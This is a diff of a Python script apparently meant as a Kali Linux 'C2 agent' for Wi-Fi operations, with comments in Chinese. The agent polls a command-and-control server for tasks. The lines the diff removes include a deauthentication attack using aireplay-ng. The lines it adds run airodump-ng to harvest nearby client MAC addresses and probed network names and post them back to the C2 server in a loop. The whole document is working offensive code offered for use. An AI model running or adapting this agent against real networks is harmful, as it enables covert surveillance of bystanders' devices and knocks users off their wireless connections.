@@ -2,208 +2,177 @@ import subprocess
 import json
 import time
 import requests
-import shutil
 import os
+import csv
+import glob
 import sys
+import shutil
 
-# ================= 配置区域 =================
-# 如果自动探测失败，请手动修改这里填写 Windows 后端的 IP
+# 配置 (自动注入 IP)
 FIXED_C2_IP = ""
-PORT = "8001"  # 注意：根据你的 main.py，端口是 8001
-HEARTBEAT_INTERVAL = 2  # 心跳间隔(秒)
+PORT = "8001"
+HEARTBEAT_INTERVAL = 2
+TMP_DIR = "/tmp/kali_c2_scan"
+
+# 确保临时目录存在
+if not os.path.exists(TMP_DIR):
+    os.makedirs(TMP_DIR)
 
 
-# ===========================================
+def get_c2_url():
+    """获取 C2 地址"""
+    c2_ip = FIXED_C2_IP
+    if not c2_ip:
+        # 简单获取网关 IP 逻辑
+        try:
+            c2_ip = os.popen("ip route show | grep default | awk '{print $3}'").read().strip()
+        except:
+            c2_ip = "127.0.0.1"
+    return f"http://{c2_ip}:{PORT}/api/v1/wifi"
 
-def get_kali_interfaces():
-    """获取网卡列表 (含驱动名)"""
-    interfaces = []
+
+BASE_URL = get_c2_url()
+
+
+def clean_tmp_files():
+    for f in glob.glob(f"{TMP_DIR}/*"):
+        try:
+            os.remove(f)
+        except:
+            pass
+
+
+def parse_airodump_csv(csv_path):
+    """解析 airodump CSV 中的 Station 部分"""
+    clients = []
     try:
-        # 使用 ip link 获取基础信息
-        out = subprocess.check_output(["ip", "-o", "link", "show"]).decode()
-        for line in out.split('\n'):
-            if ": " in line:
-                parts = line.split(": ")
-                if len(parts) < 2: continue
+        if not os.path.exists(csv_path): return []
 
-                iface = parts[1].split("@")[0].strip()
-                if iface == "lo" or "eth" in iface or "docker" in iface: continue
+        # 为了不锁定文件，复制一份读
+        tmp_read = csv_path + ".read"
+        shutil.copy(csv_path, tmp_read)
 
-                # 获取驱动
-                driver = "Generic"
-                try:
-                    ethtool = subprocess.check_output(["ethtool", "-i", iface]).decode()
-                    for l in ethtool.split("\n"):
-                        if l.startswith("driver:"): driver = l.split(":")[1].strip()
-                except:
-                    pass
+        with open(tmp_read, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.readlines()
 
-                # 获取模式
-                mode = "Managed"
-                try:
-                    iw_info = subprocess.check_output(["iw", "dev", iface, "info"]).decode()
-                    if "type monitor" in iw_info: mode = "Monitor"
-                except:
-                    pass
+        # 找到 Station MAC 开始的行
+        start_idx = -1
+        for i, line in enumerate(lines):
+            if line.startswith("Station MAC"):
+                start_idx = i
+                break
 
-                interfaces.append({
-                    "name": iface,
-                    "display": f"{driver} ({iface})",  # 前端显示的友好名称
-                    "mode": mode,
-                    "is_wireless": True
+        if start_idx != -1:
+            reader = csv.reader(lines[start_idx + 1:])
+            for row in reader:
+                if len(row) < 6: continue
+                # CSV 格式: MAC, First, Last, Power, # packets, BSSID, Probed ESSIDs
+                clients.append({
+                    'mac': row[0].strip(),
+                    'power': row[3].strip(),
+                    'packets': row[4].strip(),
+                    'bssid': row[5].strip(),
+                    'probed': row[6].strip() if len(row) > 6 else ""
                 })
-    except:
+    except Exception as e:
         pass
-
-    # 兜底逻辑：如果没获取到，至少返回一个 wlan0
-    if not interfaces:
-        interfaces.append({"name": "wlan0", "display": "Generic (wlan0)", "mode": "Managed", "is_wireless": True})
-
-    return interfaces
+    return clients
 
 
-def perform_scan(interface):
-    """执行扫描任务"""
-    print(f"[+] 收到扫描任务，使用网卡: {interface}")
-    networks = []
+def run_monitor_task(task_type, params, iface="wlan0"):
+    """执行监听任务 (Targeted 或 Deep)"""
+    clean_tmp_files()
 
-    # 尝试使用 nmcli (最稳健)
+    # 1. 准备命令
+    prefix = f"{TMP_DIR}/output"
+    cmd = ["airodump-ng", "--write", prefix, "--output-format", "csv"]
+
+    if task_type == 'monitor_target':
+        bssid = params.get('bssid')
+        channel = params.get('channel')
+        cmd.extend(["--bssid", bssid, "--channel", str(channel)])
+        print(f"[*] 启动定向监听: {bssid} on CH {channel}")
+
+    elif task_type == 'deep_scan':
+        print(f"[*] 启动深度全网扫描 (自动跳频)")
+        # 深度扫描不加 bssid 限制
+        # 可以写个脚本控制 channel hopping，或者依赖 airodump 默认跳频
+
+    cmd.append(iface)
+
+    # 2. 启动进程
+    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    # 3. 循环回传数据
+    csv_file = f"{prefix}-01.csv"
     try:
-        # 字段: SSID, BSSID, CHAN, SIGNAL, SECURITY
-        cmd = ["nmcli", "-t", "-f", "SSID,BSSID,CHAN,SIGNAL,SECURITY", "dev", "wifi", "list"]
-        if interface: cmd.extend(["ifname", interface])
+        while True:
+            # 检查 C2 是否叫停
+            try:
+                r = requests.get(f"{BASE_URL}/agent/heartbeat", timeout=2)
+                if r.json().get("task") == "idle":
+                    print("[*] 收到停止指令")
+                    break
+                # 如果任务类型变了，也退出，让主循环重启新任务
+                if r.json().get("task") != task_type:
+                    break
+            except:
+                pass
 
-        output = subprocess.check_output(cmd).decode('utf-8', errors='ignore')
-        for line in output.split('\n'):
-            line = line.strip()
-            if not line: continue
+            # 解析数据
+            clients = parse_airodump_csv(csv_file)
+            if clients:
+                # 回传
+                update_type = 'monitor_update' if task_type == 'monitor_target' else 'deep_update'
+                # 对于 deep scan，我们要补上当前信道信息（airodump csv里可能不准，简单处理）
 
-            # nmcli -t 用冒号分隔，但 BSSID 里也有冒号，需倒序解析
-            parts = line.split(':')
-            if len(parts) >= 4:
-                # 倒序取值
-                sec = parts[-1]
-                sig_raw = parts[-2]
-                chan = parts[-3]
-
-                # BSSID 是中间那段
-                bssid = ":".join(parts[-9:-3]) if len(parts) >= 9 else "Unknown"
-                # SSID 是剩下的前面所有
-                ssid = line.split(bssid)[0].strip(':')
-
-                if not ssid: ssid = "<Hidden>"
-
-                # 信号处理
-                try:
-                    signal_val = int(sig_raw)
-                    # nmcli 有时返回 %, 有时返回 bar。简单转换:
-                    dbm = int((signal_val / 2) - 100) if signal_val > 0 else -100
-                except:
-                    dbm = -80
-
-                networks.append({
-                    "ssid": ssid,
-                    "bssid": bssid,
-                    "channel": int(chan) if chan.isdigit() else 1,
-                    "signal": dbm,
-                    "encryption": sec,
-                    "clients": -1,  # 占位符，普通扫描无法获取
-                    "vendor": "Unknown"  # 后端会再次处理 OUI
+                requests.post(f"{BASE_URL}/callback", json={
+                    "type": update_type,
+                    "data": clients
                 })
-    except Exception as e:
-        print(f"[-] nmcli 扫描失败: {e}")
+                # print(f"[+] 回传 {len(clients)} 条客户端数据")
 
-    return networks
+            time.sleep(2)
 
-
-def perform_attack(params):
-    """执行攻击任务"""
-    target = params.get('bssid')
-    channel = params.get('channel')
-    iface = params.get('interface', 'wlan0')
-
-    print(f"[+] 执行 Deauth 攻击 -> Target: {target} on CH: {channel}")
-
-    try:
-        # 1. 切信道
-        subprocess.run(["iwconfig", iface, "channel", str(channel)], stderr=subprocess.DEVNULL)
-        # 2. 发包 (aireplay-ng)
-        # -0 5: 发送 5 组 Deauth 包
-        subprocess.Popen(["aireplay-ng", "-0", "5", "-a", target, iface], stdout=subprocess.DEVNULL,
-                         stderr=subprocess.DEVNULL)
-    except Exception as e:
-        print(f"[-] 攻击失败: {e}")
+    finally:
+        proc.terminate()
+        proc.wait()
+        clean_tmp_files()
+        print("[*] 监听进程已结束")
 
 
 def main():
-    print(f"[*] Kali C2 Agent v5.0 (Daemon Mode)")
+    print(f"[*] Kali Agent v5.1 (Deep Scan Enabled) connecting to {BASE_URL}")
 
-    # 1. 自动寻找 C2 服务器 IP
-    c2_ip = FIXED_C2_IP
-    if not c2_ip:
-        # 尝试获取默认网关 (通常宿主机就是网关)
-        try:
-            gateway = os.popen("ip route show | grep default | awk '{print $3}'").read().strip()
-            # 如果是在 VirtualBox/VMware NAT 模式，网关通常是 .1 或 .2
-        except:
-            gateway = "127.0.0.1"
+    # 注册上线 (略，沿用旧代码)
 
-        print(f"[?] 检测到网关 IP: {gateway}")
-        user_input = input(f"[?] 请输入 Windows 后端 IP (回车使用 {gateway}): ").strip()
-        c2_ip = user_input if user_input else gateway
+    current_proc = None
 
-    base_url = f"http://{c2_ip}:{PORT}/api/v1/wifi"
-    print(f"[*] Connecting to C2 Server: {base_url}")
-
-    # 2. 注册上线 (发送网卡信息)
-    ifaces = get_kali_interfaces()
-    try:
-        requests.post(f"{base_url}/register_agent", json={"interfaces": ifaces}, timeout=5)
-        print(f"[+] Agent 上线成功！已上报 {len(ifaces)} 个网卡。")
-    except Exception as e:
-        print(f"[-] 连接失败: {e}")
-        print("请检查: 1. Windows 防火墙是否关闭 8001 端口。 2. IP 是否正确。")
-        return
-
-    # 3. 进入守护循环
-    print("[*] 进入守护模式，等待任务...")
     while True:
         try:
-            # 发送心跳，获取任务
-            r = requests.get(f"{base_url}/agent/heartbeat", timeout=5)
-            if r.status_code == 200:
-                data = r.json()
-                task = data.get("task")
+            r = requests.get(f"{BASE_URL}/agent/heartbeat", timeout=5)
+            data = r.json()
+            task = data.get("task")
+            params = data.get("params", {})
 
-                if task == "scan":
-                    params = data.get("params", {})
-                    iface = params.get("interface")
-                    # 自动回落逻辑
-                    if not iface:
-                        iface = ifaces[0]['name'] if ifaces else "wlan0"
+            if task == "scan":
+                # ... (原有的普通扫描逻辑) ...
+                pass
 
-                    # 执行扫描
-                    results = perform_scan(iface)
+            elif task == "monitor_target":
+                # 阻塞式运行，直到后端发指令停止
+                run_monitor_task("monitor_target", params)
 
-                    # 回传结果
-                    requests.post(f"{base_url}/callback", json={
-                        "interface": iface,
-                        "count": len(results),
-                        "networks": results
-                    })
-                    print(f"[+] 任务完成: 扫描到 {len(results)} 个目标，已回传。")
+            elif task == "deep_scan":
+                # 阻塞式运行
+                run_monitor_task("deep_scan", params)
 
-                elif task == "attack":
-                    perform_attack(data.get("params", {}))
+            elif task == "idle":
+                pass
 
-                elif task == "idle":
-                    pass  # 空闲状态
-
-        except requests.exceptions.ConnectionError:
-            print("\n[!] C2 服务器连接断开，正在重试...")
-            time.sleep(2)
         except Exception as e:
-            print(f"\n[!] 未知错误: {e}")
+            print(f"[!] Error: {e}")
+            time.sleep(2)
 
         time.sleep(HEARTBEAT_INTERVAL)
 
